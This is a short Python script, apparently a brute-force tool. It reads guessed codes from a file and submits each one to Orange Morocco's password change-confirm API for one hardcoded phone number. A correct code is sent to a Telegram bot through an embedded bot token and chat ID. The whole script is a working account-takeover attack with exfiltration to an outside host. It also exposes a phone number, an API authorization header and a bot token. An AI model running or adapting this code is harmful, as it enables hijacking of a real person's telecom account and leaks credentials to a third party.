import requests
import threading,os
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
ss = 0
aa = 0
rfile = open("4",'r')
while True:
	try:
		ff = rfile.readline().split('\n')[0]
		codes = "5"+ff
		url = "https://apps.orange.ma/orangeetmoi/api/backend/v7.8/account/password/change-confirm"
		headers = {
		            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		            "Host": "apps.orange.ma",
		            "Connection": "Keep-Alive",
		            "Accept-Encoding": "gzip",
		            "Authorization": "Basic bW9iaWxlX3VzZXI6T3JhbmdlXzIwMTg="
		}
		data = {
			        "culture":"fr",
			        "code":codes,
			        "msisdn":"0674319502"
		}
		req = requests.post(url, headers=headers, data=data)
		print(req.text)
		if "Le code que vous avez saisi est correct"  in req.text:
		    print(f"GOODS CODES >>>>{codes}")
		    requests.post(f"""https://api.telegram.org/bot5223860535:AAHkB7r3UVyvek6MGdMcSMYmH6dYlnTtn80/sendMessage?chat_id=1803859361&text={codes}""")
		else:
			print(f"BAD CODES >>>>{codes}[0674319502]")
	except requests.exceptions.ConnectionError as e:
		print(f"BAD REQ >>> {codes}")
